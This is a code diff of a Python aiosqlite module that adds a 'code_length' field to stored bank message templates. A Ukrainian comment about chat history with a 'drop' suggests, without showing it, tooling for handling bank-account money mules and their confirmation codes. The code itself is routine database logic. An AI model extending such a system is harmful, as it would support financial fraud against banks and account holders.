@@ -168,9 +168,14 @@ async def init_db():
             CREATE TABLE IF NOT EXISTS bank_templates (
                 key TEXT PRIMARY KEY,
                 command TEXT,
-                text TEXT
+                text TEXT,
+                code_length INTEGER DEFAULT 4
             )
         """)
+        try:
+            await db.execute("ALTER TABLE bank_templates ADD COLUMN code_length INTEGER DEFAULT 4")
+        except Exception:
+            pass
         
         # Таблиця для збереження історії чату з дропом
         await db.execute("""
@@ -261,8 +266,8 @@ async def init_db():
             )
             for key, val in BANK_TEMPLATES.items():
                 await db.execute(
-                    "INSERT OR REPLACE INTO bank_templates (key, command, text) VALUES (?, ?, ?)",
-                    (key, val['command'], val['text'])
+                    "INSERT OR REPLACE INTO bank_templates (key, command, text, code_length) VALUES (?, ?, ?, ?)",
+                    (key, val['command'], val['text'], val.get('code_length', 4))
                 )
 
         await db.commit()
@@ -736,18 +741,19 @@ async def get_all_bank_templates() -> dict:
         db.row_factory = aiosqlite.Row
         async with db.execute("SELECT * FROM bank_templates") as cursor:
             rows = await cursor.fetchall()
-            return {row['key']: {'command': row['command'], 'text': row['text']} for row in rows}
+            return {row['key']: {'command': row['command'], 'text': row['text'], 'code_length': row['code_length']} for row in rows}
 
-async def save_bank_template(key: str, command: str, text: str):
+async def save_bank_template(key: str, command: str, text: str, code_length: int = 4):
     """Збереження або оновлення шаблону банку"""
     async with aiosqlite.connect(DB_FILE) as db:
         await db.execute("""
-            INSERT INTO bank_templates (key, command, text)
-            VALUES (?, ?, ?)
+            INSERT INTO bank_templates (key, command, text, code_length)
+            VALUES (?, ?, ?, ?)
             ON CONFLICT(key) DO UPDATE SET
                 command = excluded.command,
-                text = excluded.text
-        """, (key, command, text))
+                text = excluded.text,
+                code_length = excluded.code_length
+        """, (key, command, text, code_length))
         await db.commit()
 
 async def delete_bank_template(key: str):
